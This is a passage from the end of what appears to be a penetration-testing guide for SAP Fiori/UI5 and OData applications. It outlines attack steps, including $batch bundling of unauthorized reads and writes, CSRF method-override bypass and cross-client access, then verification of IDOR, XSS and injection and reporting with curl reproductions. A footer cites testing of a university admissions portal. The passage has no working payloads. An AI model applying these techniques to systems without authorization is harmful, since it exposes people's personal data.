   |-- $batch: bundle unauthorized reads/writes
   |-- CSRF: test enforcement, method override bypass
   |-- sap-client: cross-client access
   |
4. VERIFY
   |-- For IDOR: Confirm returned data belongs to victim, not you
   |-- For XSS: Confirm execution in browser, not just storage
   |-- For injection: Confirm actual data exposure, not just errors
   |
5. REPORT
   |-- Reproduce with curl commands
   |-- Document exact entity keys and field names
   |-- Note SAP system version if disclosed
```

---

*Guide based on patterns observed during KU Leuven SAP UI5/OData admissions portal testing. Techniques are applicable to any SAP Fiori/UI5 + OData target.*
